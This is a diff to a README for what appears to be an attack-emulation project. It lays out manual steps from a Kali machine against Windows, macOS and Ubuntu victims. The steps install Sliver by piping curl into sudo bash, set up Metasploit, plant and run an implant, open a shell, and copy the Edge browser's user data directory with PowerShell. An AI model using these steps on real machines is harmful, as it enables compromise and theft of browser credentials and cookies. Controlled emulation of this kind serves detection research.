@@ -62,34 +62,29 @@ You can download form official website of Kali(https://www.kali.org/)
 Victims：a Windows 10, a macOS and an Ubuntu
 
 ### Execute the attack manually
-Each `UUID` encompasses an `executor`, within which the `command` parameter specifies the actual attack command that needs to be executed. You should proceed manually through the attack steps in the sequence of the UUIDs. 
+Each `uuid` encompasses an `executor`, within which the `command` parameter specifies the actual attack command that needs to be executed. You should proceed manually through the attack steps in the sequence of the UUIDs. 
+
 ①Download the latest `Sliver` or `Metasploit` for your attack platform, and just run the binary.
 ```bash
 # Sliver
 kali > curl https://sliver.sh/install|sudo bash
-kali > sliver
+kali > sliver 
 # Metasploit
-
+kali > sudo apt-get install metasploit-framework
+kali > msfconsole 
 ```
 
-②Generate a beacon implant for the Windows platform and enable mTLS monitoring with the specified IP address.
-```
-sliver > generate beacon --arch <target_architecture> --os  <target_os> --mtls <Server IP> --save .
-sliver > mtls
-```
-③Download the sliver implant manually and execute it on the target machine.
+②Utilize `Sliver` or `Metasploit` to generate an implant for the target victim and initiate listening.
+
+③Download the implant manually and execute it on the target machine.
 
 ④Interact with a specific session identified by session_id.
+
+⑤Open an interactive shell on the compromised machine.
+
+⑥Execute attack commands, for example, "Copy the Edge browser's default user data directory to a specified location for further analysis."
 ```
-sliver > sessions -i session_id
-```
-⑤Open an interactive powershell on the compromised machine.
-```
-sliver (SESSION_NAME) > shell
-```
-⑥Copy the Edge browser's default user data directory to a specified location for further analysis.
-```
-Powershell > Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default" -Destination "C:\Users\win\Desktop\Edge" -Force -Recurse
+shell > Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default" -Destination "C:\Users\win\Desktop\Edge" -Force -Recurse
 ```
 
 ## System Overview
